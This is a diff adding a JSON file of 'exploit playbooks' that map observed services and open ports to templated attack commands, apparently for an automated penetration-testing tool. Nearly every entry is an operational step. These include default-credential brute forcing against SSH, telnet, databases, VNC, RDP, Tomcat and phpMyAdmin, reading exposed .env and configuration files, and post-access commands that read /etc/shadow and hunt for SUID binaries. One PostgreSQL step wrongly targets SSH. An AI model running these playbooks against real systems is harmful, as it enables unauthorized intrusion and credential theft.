@@ -1,0 +1,334 @@
+{
+  "_meta": {
+    "description": "Exploit playbooks — multi-step attack sequences",
+    "repeatable": "false = one-and-done (enumeration/recon), true = can retry (cred attacks)"
+  },
+  "playbooks": [
+    {
+      "id": "smb_share_read",
+      "trigger_obs": "shares accessible",
+      "trigger_ports": [445, 139],
+      "repeatable": false,
+      "desc": "Read contents of accessible SMB shares",
+      "steps": [
+        "smbclient -N //{ip}/{share} -c 'recurse ON; ls'",
+        "impacket-samrdump {ip}",
+        "nxc smb {ip} -u '' -p '' --rid-brute"
+      ]
+    },
+    {
+      "id": "pihole_exploit",
+      "trigger_obs": "Pi-hole",
+      "trigger_ports": [80, 443],
+      "repeatable": false,
+      "desc": "Exploit Pi-hole web interface",
+      "steps": [
+        "curl -s -X POST http://{ip}/admin/index.php -d 'pw=admin'",
+        "curl -s -X POST http://{ip}/admin/index.php -d 'pw=raspberry'",
+        "curl -s http://{ip}/admin/api.php?status",
+        "gobuster dir -u http://{ip}/admin -w /usr/share/wordlists/dirb/common.txt -q -t 5"
+      ]
+    },
+    {
+      "id": "dns_zone_transfer",
+      "trigger_obs": "DNS resolver",
+      "trigger_ports": [53],
+      "repeatable": false,
+      "desc": "Attempt DNS zone transfer and enumerate",
+      "steps": [
+        "dig axfr @{ip}",
+        "dig @{ip} any",
+        "dig @{ip} -x 192.168.1.1"
+      ]
+    },
+    {
+      "id": "samba_deep",
+      "trigger_obs": "Samba version",
+      "trigger_ports": [445],
+      "repeatable": false,
+      "desc": "Deep Samba enumeration after version detection",
+      "steps": [
+        "impacket-samrdump {ip}",
+        "impacket-rpcdump {ip}",
+        "nmap -T2 --script=smb-vuln-cve-2017-7494 -p 445 {ip}"
+      ]
+    },
+    {
+      "id": "http_deep",
+      "trigger_obs": "HTTP server",
+      "trigger_ports": [80, 8080, 8888, 443],
+      "repeatable": false,
+      "desc": "Deep HTTP enumeration",
+      "steps": [
+        "curl -s http://{ip}/robots.txt",
+        "curl -s http://{ip}/.env",
+        "nikto -h http://{ip} -Tuning 1 -maxtime 60s",
+        "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt -q -t 5"
+      ]
+    },
+    {
+      "id": "vnc_attack",
+      "trigger_obs": "VNC",
+      "trigger_ports": [5900, 5901],
+      "repeatable": false,
+      "desc": "VNC password brute force",
+      "steps": [
+        "nxc vnc {ip} -p password",
+        "nxc vnc {ip} -p raspberry",
+        "nxc vnc {ip} -p admin",
+        "nmap -T2 --script=vnc-info,realvnc-auth-bypass -p 5900 {ip}"
+      ]
+    },
+    {
+      "id": "ssh_full_attack",
+      "trigger_obs": "SSH:",
+      "trigger_ports": [22],
+      "repeatable": false,
+      "desc": "Full SSH credential attack",
+      "steps": [
+        "nxc ssh {ip} -u pi -p raspberry",
+        "nxc ssh {ip} -u root -p root",
+        "nxc ssh {ip} -u admin -p admin",
+        "nmap -T2 --script=ssh-auth-methods -p 22 {ip}"
+      ]
+    },
+    {
+      "id": "telnet_attack",
+      "trigger_obs": "telnet",
+      "trigger_ports": [23],
+      "repeatable": true,
+      "desc": "Telnet default credentials",
+      "steps": [
+        "nxc telnet {ip} -u admin -p admin",
+        "nxc telnet {ip} -u root -p root",
+        "nxc telnet {ip} -u admin -p password"
+      ]
+    },
+    {
+      "id": "ftp_attack",
+      "trigger_obs": "ftp",
+      "trigger_ports": [21],
+      "repeatable": true,
+      "desc": "FTP anonymous + default creds",
+      "steps": [
+        "nxc ftp {ip} -u anonymous -p anonymous",
+        "nmap -T2 --script=ftp-anon,ftp-vsftpd-backdoor -p 21 {ip}"
+      ]
+    },
+    {
+      "id": "redis_attack",
+      "trigger_obs": "redis",
+      "trigger_ports": [6379],
+      "repeatable": false,
+      "desc": "Redis unauthenticated access",
+      "steps": [
+        "redis-cli -h {ip} INFO",
+        "redis-cli -h {ip} CONFIG GET dir"
+      ]
+    },
+    {
+      "id": "mysql_attack",
+      "trigger_obs": "mysql",
+      "trigger_ports": [3306],
+      "repeatable": true,
+      "desc": "MySQL default creds",
+      "steps": [
+        "nxc mysql {ip} -u root -p root",
+        "nxc mysql {ip} -u root -p ''"
+      ]
+    },
+    {
+      "id": "post_auth_ssh",
+      "trigger_obs": "ACCESS GAINED",
+      "trigger_ports": [22],
+      "repeatable": false,
+      "desc": "Post-exploitation enumeration after SSH access",
+      "steps": [
+        "nxc ssh {ip} -u {user} -p {password} -x 'cat /etc/passwd'",
+        "nxc ssh {ip} -u {user} -p {password} -x 'uname -a; id; sudo -l 2>/dev/null'",
+        "nxc ssh {ip} -u {user} -p {password} -x 'find / -perm -4000 -type f 2>/dev/null | head -20'",
+        "nxc ssh {ip} -u {user} -p {password} -x 'cat /etc/shadow 2>/dev/null || echo no-access'"
+      ]
+    },
+    {
+      "id": "snmp_enum",
+      "trigger_obs": "snmp",
+      "trigger_ports": [161],
+      "repeatable": false,
+      "desc": "SNMP enumeration with common community strings",
+      "steps": [
+        "onesixtyone {ip} -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 2>/dev/null || nmap -T2 -sU --script=snmp-brute -p 161 {ip}",
+        "snmpwalk -v2c -c public {ip} system 2>/dev/null || nmap -T2 -sU --script=snmp-sysdescr -p 161 {ip}",
+        "snmpwalk -v2c -c public {ip} interfaces 2>/dev/null || nmap -T2 -sU --script=snmp-interfaces -p 161 {ip}",
+        "nmap -T2 -sU --script=snmp-processes -p 161 {ip}"
+      ]
+    },
+    {
+      "id": "nfs_enum",
+      "trigger_obs": "nfs",
+      "trigger_ports": [111, 2049],
+      "repeatable": false,
+      "desc": "NFS share enumeration and listing",
+      "steps": [
+        "showmount -e {ip}",
+        "nmap -T2 --script=nfs-showmount,nfs-ls -p 111,2049 {ip}"
+      ]
+    },
+    {
+      "id": "ldap_enum",
+      "trigger_obs": "ldap",
+      "trigger_ports": [389, 636],
+      "repeatable": false,
+      "desc": "LDAP anonymous bind enumeration",
+      "steps": [
+        "nmap -T2 --script=ldap-rootdse -p 389 {ip}",
+        "ldapsearch -x -H ldap://{ip} -b '' -s base namingContexts 2>/dev/null",
+        "nmap -T2 --script=ldap-search -p 389 {ip}"
+      ]
+    },
+    {
+      "id": "smtp_enum",
+      "trigger_obs": "smtp",
+      "trigger_ports": [25, 587],
+      "repeatable": false,
+      "desc": "SMTP user enumeration and relay check",
+      "steps": [
+        "nmap -T2 --script=smtp-commands -p 25 {ip}",
+        "nmap -T2 --script=smtp-enum-users --script-args smtp-enum-users.methods=VRFY -p 25 {ip}",
+        "nmap -T2 --script=smtp-open-relay -p 25 {ip}"
+      ]
+    },
+    {
+      "id": "wordpress_attack",
+      "trigger_obs": "WordPress",
+      "trigger_ports": [80, 443, 8080],
+      "repeatable": false,
+      "desc": "WordPress enumeration and brute force",
+      "steps": [
+        "wpscan --url http://{ip} --enumerate u,vp --no-banner --random-user-agent 2>/dev/null",
+        "nmap -T2 --script=http-wordpress-enum -p 80 {ip}",
+        "curl -s http://{ip}/wp-login.php"
+      ]
+    },
+    {
+      "id": "mssql_attack",
+      "trigger_obs": "ms-sql",
+      "trigger_ports": [1433],
+      "repeatable": true,
+      "desc": "Microsoft SQL Server default creds and enum",
+      "steps": [
+        "nmap -T2 --script=ms-sql-info -p 1433 {ip}",
+        "nmap -T2 --script=ms-sql-empty-password -p 1433 {ip}",
+        "nxc mssql {ip} -u sa -p sa",
+        "nxc mssql {ip} -u sa -p ''"
+      ]
+    },
+    {
+      "id": "mongodb_attack",
+      "trigger_obs": "mongodb",
+      "trigger_ports": [27017],
+      "repeatable": false,
+      "desc": "MongoDB unauthenticated access",
+      "steps": [
+        "nmap -T2 --script=mongodb-info -p 27017 {ip}",
+        "nmap -T2 --script=mongodb-databases -p 27017 {ip}"
+      ]
+    },
+    {
+      "id": "rdp_enum",
+      "trigger_obs": "rdp",
+      "trigger_ports": [3389],
+      "repeatable": false,
+      "desc": "RDP enumeration and vuln check",
+      "steps": [
+        "nmap -T2 --script=rdp-ntlm-info -p 3389 {ip}",
+        "nmap -T2 --script=rdp-enum-encryption -p 3389 {ip}",
+        "nxc rdp {ip} -u admin -p admin",
+        "nxc rdp {ip} -u administrator -p password"
+      ]
+    },
+    {
+      "id": "ipmi_attack",
+      "trigger_obs": "ipmi",
+      "trigger_ports": [623],
+      "repeatable": false,
+      "desc": "IPMI cipher zero and hash dump",
+      "steps": [
+        "nmap -T2 -sU --script=ipmi-version -p 623 {ip}",
+        "nmap -T2 -sU --script=ipmi-cipher-zero -p 623 {ip}"
+      ]
+    },
+    {
+      "id": "docker_api",
+      "trigger_obs": "docker",
+      "trigger_ports": [2375, 2376],
+      "repeatable": false,
+      "desc": "Docker unauthenticated API check",
+      "steps": [
+        "curl -s http://{ip}:2375/version",
+        "curl -s http://{ip}:2375/containers/json",
+        "nmap -T2 --script=docker-version -p 2375 {ip}"
+      ]
+    },
+    {
+      "id": "postgres_attack",
+      "trigger_obs": "postgres",
+      "trigger_ports": [5432],
+      "repeatable": true,
+      "desc": "PostgreSQL default creds",
+      "steps": [
+        "nxc ssh {ip} -u postgres -p postgres",
+        "nmap -T2 --script=pgsql-brute --script-args userdb=/usr/share/nmap/nselib/data/usernames.lst,passdb=/usr/share/nmap/nselib/data/passwords.lst -p 5432 {ip}"
+      ]
+    },
+    {
+      "id": "http_tomcat",
+      "trigger_obs": "Tomcat",
+      "trigger_ports": [8080, 80, 443],
+      "repeatable": false,
+      "desc": "Apache Tomcat manager enumeration",
+      "steps": [
+        "curl -s http://{ip}:8080/manager/html -u tomcat:tomcat",
+        "curl -s http://{ip}:8080/manager/html -u admin:admin",
+        "curl -s http://{ip}:8080/manager/status",
+        "gobuster dir -u http://{ip}:8080 -w /usr/share/wordlists/dirb/common.txt -q -t 5"
+      ]
+    },
+    {
+      "id": "http_jenkins",
+      "trigger_obs": "Jenkins",
+      "trigger_ports": [8080, 80, 443],
+      "repeatable": false,
+      "desc": "Jenkins unauthenticated access check",
+      "steps": [
+        "curl -s http://{ip}:8080/",
+        "curl -s http://{ip}:8080/script",
+        "curl -s http://{ip}:8080/api/json"
+      ]
+    },
+    {
+      "id": "http_phpmyadmin",
+      "trigger_obs": "phpMyAdmin",
+      "trigger_ports": [80, 443, 8080],
+      "repeatable": false,
+      "desc": "phpMyAdmin login check",
+      "steps": [
+        "curl -s http://{ip}/phpmyadmin/",
+        "curl -s -X POST http://{ip}/phpmyadmin/index.php -d 'pma_username=root&pma_password=root'",
+        "curl -s -X POST http://{ip}/phpmyadmin/index.php -d 'pma_username=root&pma_password='"
+      ]
+    },
+    {
+      "id": "joomla_enum",
+      "trigger_obs": "Joomla",
+      "trigger_ports": [80, 443],
+      "repeatable": false,
+      "desc": "Joomla enumeration",
+      "steps": [
+        "curl -s http://{ip}/administrator/",
+        "curl -s http://{ip}/configuration.php-dist",
+        "nmap -T2 --script=http-joomla-brute -p 80 {ip}"
+      ]
+    }
+  ]
+}
